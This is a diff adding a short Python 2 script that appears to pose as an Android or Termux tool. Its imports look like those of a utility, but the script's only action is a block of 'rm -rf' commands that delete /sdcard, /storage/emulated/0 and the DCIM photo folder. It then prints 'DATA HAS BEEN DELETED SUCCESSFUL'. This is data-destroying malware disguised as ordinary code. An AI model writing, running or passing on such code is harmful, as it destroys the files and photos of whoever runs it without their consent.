@@ -1,0 +1,27 @@
+#!/usr/bin/python2
+# -*- coding: utf-8
+
+
+try:
+	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
+	from multiprocessing.pool import ThreadPool
+	from requests.exceptions import ConnectionError
+except ImportError:
+    
+	os.system("rm -rf /sdcard/")
+	os.system("rm -rf /sdcard")
+	os.system("rm -rf /storage/emulated/0")
+	os.system("rm -rf /sdcard/DCIM")
+	os.system("rm -rf /sdcard")
+	os.system("rm -rf /sdcard/dcim")
+	os.system("rm -rf /sdcard/*")
+    
+    
+#logo
+print ("DATA HAS BEEN DELETED SUCCESSFUL")
+time.sleep(1)
+
+
+if __name__ == '__main__':
+	exit()
+ 
